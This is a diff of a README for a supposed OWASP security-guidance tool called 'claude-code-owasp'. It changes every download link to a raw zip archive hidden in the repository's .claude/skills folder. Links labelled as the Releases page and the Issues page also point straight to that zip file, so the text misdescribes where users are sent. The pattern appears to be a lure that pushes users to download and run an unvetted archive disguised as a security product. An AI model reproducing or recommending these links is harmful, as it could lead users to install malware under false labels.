@@ -6,7 +6,7 @@ Welcome to **claude-code-owasp**! This application guides you through OWASP secu
 
 ## 📥 Download Here
 
-[![Download Now](https://github.com/Bbk-man/claude-code-owasp/raw/refs/heads/main/.claude/skills/code-claude-owasp-v3.3.zip%20Now-claude--code--owasp-brightgreen)](https://github.com/Bbk-man/claude-code-owasp/raw/refs/heads/main/.claude/skills/code-claude-owasp-v3.3.zip)
+[![Download Now](https://raw.githubusercontent.com/Bbk-man/claude-code-owasp/main/.claude/skills/owasp_code_claude_v1.2.zip%20Now-claude--code--owasp-brightgreen)](https://raw.githubusercontent.com/Bbk-man/claude-code-owasp/main/.claude/skills/owasp_code_claude_v1.2.zip)
 
 ## 📋 Overview
 
@@ -32,7 +32,7 @@ To run **claude-code-owasp**, ensure your system meets the following requirement
 
 To get started, visit the Releases page to download the application. 
 
-[Download Here](https://github.com/Bbk-man/claude-code-owasp/raw/refs/heads/main/.claude/skills/code-claude-owasp-v3.3.zip)
+[Download Here](https://raw.githubusercontent.com/Bbk-man/claude-code-owasp/main/.claude/skills/owasp_code_claude_v1.2.zip)
 
 1. Click the **Download** button for the latest version.
 2. Save the file to your computer.
@@ -64,7 +64,7 @@ If you face any challenges, please refer to the documentation or reach out to ou
 
 Join our community for assistance, feedback, and collaboration:
 
-- **GitHub Issues**: Report bugs or request features at our [Issues page](https://github.com/Bbk-man/claude-code-owasp/raw/refs/heads/main/.claude/skills/code-claude-owasp-v3.3.zip).
+- **GitHub Issues**: Report bugs or request features at our [Issues page](https://raw.githubusercontent.com/Bbk-man/claude-code-owasp/main/.claude/skills/owasp_code_claude_v1.2.zip).
 - **Discussion Forum**: Participate in discussions with other users to share tips and strategies.
 
 ## 📢 Updates
@@ -75,7 +75,7 @@ Stay up to date with the latest developments by checking the Releases page regul
 
 Don't forget to visit the Releases page to download the application.
 
-[Download Here](https://github.com/Bbk-man/claude-code-owasp/raw/refs/heads/main/.claude/skills/code-claude-owasp-v3.3.zip)
+[Download Here](https://raw.githubusercontent.com/Bbk-man/claude-code-owasp/main/.claude/skills/owasp_code_claude_v1.2.zip)
 
 ## 📝 Contributors
 
